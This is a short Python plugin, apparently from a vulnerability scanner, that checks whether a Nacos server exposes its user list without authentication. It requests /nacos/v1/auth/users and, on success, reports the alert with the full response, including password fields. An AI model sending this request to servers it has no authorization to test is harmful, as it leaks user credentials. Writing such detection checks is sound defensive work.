#!/usr/bin/env python
# coding=utf-8

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    base_url = "{}://{}:{}".format(service, ip, port)
    path = "/nacos/v1/auth/users?pageNo=1&pageSize=900"

    try:
        r = await http_client(ip, port).get(base_url + path, timeout=20)
        if r.status_code == 200 and r.json()["pageItems"] and r.json()['pageItems'][0]['password']:
            advice = "http://THIS_LINK_HAS_BEEN_REMOVED"
            ret = {
                'alert_group': 'Nacos Unauthorized Access',
                'affects': base_url,
                'details': 'fix advice: {ad}\n\nresponse:\n{data}'.format(ad=advice, data=r.text)
            }
            return ret
    except json.decoder.JSONDecodeError as e:
        pass
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8848, 'http', True, {})
    run_plugin_test(scan)
